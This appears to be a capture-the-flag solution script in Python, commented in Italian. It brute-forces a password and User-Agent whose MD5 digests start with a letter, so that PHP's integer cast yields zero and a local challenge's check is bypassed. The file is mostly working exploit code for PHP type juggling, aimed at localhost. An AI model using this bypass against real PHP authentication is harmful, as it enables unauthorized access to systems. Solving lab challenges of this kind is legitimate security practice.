import hashlib
import requests

HEX_LETTERS = "abcdef"


def genera_pass_che_inizia_con(c: str) -> str:
    """
    Genera una stringa 'pass' che:
      - inizia con il carattere c
      - ha md5(pass) che inizia con una lettera tra 'a'..'f'
        (così in PHP (int)md5(pass) == 0)

    Attenzione: ha senso usare questa funzione con c in 'abcdef'
    per sfruttare il trucco 0 + 0 == 0 nel primo if.
    """
    if len(c) != 1:
        raise ValueError("c deve essere un singolo carattere")
    
    i = 0
    while True:
        candidate = f"{c}{i}"
        h = hashlib.md5(candidate.encode()).hexdigest()
        if h[0] in HEX_LETTERS:
            # Qui md5(candidate) inizia con lettera → in PHP vale 0 come int
            return candidate
        i += 1


def genera_user_agent_comodo(prefix: str = "MyUA") -> str:
    """
    Genera uno User-Agent tale che md5(ua) inizi con una lettera tra 'a'..'f',
    in modo che (int)md5($ua) == 0 in PHP.
    """
    i = 0
    while True:
        ua = f"{prefix}{i}"
        h = hashlib.md5(ua.encode()).hexdigest()
        if h[0] in HEX_LETTERS:
            return ua
        i += 1


def http_get(url: str, params: dict | None = None, headers: dict | None = None) -> str:
    """
    Esegue una GET HTTP e ritorna il body come stringa.
    """
    resp = requests.get(url, params=params, headers=headers or {}, timeout=5)
    resp.raise_for_status()
    return resp.text


BASE_URL = "http://localhost:124/"

for c in "abcdef":
    # 1) genera pass che inizia con c e con md5(pass) che porta a (int)0
    password = genera_pass_che_inizia_con(c)

    # 2) genera uno UA che dia md5(ua) → (int)0 in PHP
    ua = genera_user_agent_comodo(c)

    headers = {
        "User-Agent": ua
    }
    params = {
        "pass": password
    }

    body = http_get(BASE_URL, params=params, headers=headers)
    print(f"Tentativo con c='{c}' → pass='{password}', UA='{ua}'")

    if "CTF{" in body or "password" in body.lower():
        print("[+] FLAG TROVATA:")
        print(body)
        break
